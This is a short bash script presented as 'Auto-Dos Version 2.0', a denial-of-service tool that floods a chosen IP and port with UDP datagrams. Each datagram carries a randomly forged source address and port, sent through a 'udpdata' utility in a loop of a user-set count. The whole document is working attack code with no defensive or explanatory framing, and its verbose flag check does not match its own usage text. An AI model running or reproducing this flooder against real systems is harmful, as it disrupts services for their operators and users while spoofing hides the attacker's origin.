#!/bin/bash
# dos with udpdata
ip=$1
port=$2
hits=${3:-"1000"}
verbose=${4:-"0"}

if ([[ "$ip" == "" ]] || [[ "$port" == "" ]])
then
echo " \
-############################################-
 Auto-Dos Version 2.0 - Shellz 2016
  Usage:
  $0 [target ip][port][packets][verbose(0/1)]
-############################################-"
exit 1
fi


echo "Hitting $1:$2 With $3 datagram packets, verbose:$4"

for i in `seq 1 "$hits"`;do
randIp=$(dd if=/dev/urandom bs=4 count=1 2>/dev/null |
             od -An -tu1 |
             sed -e 's/^ *//' -e 's/  */./g')
randPort=`head -175 /dev/urandom | cksum | cut -f2 -d " "`
if [[ "$verbose" == "True" ]];
then
  echo "Source: $randIp:$randPort Dest: $ip:$port"
fi
sh -c "udpdata $randIp $randPort $ip $port"
done


exit
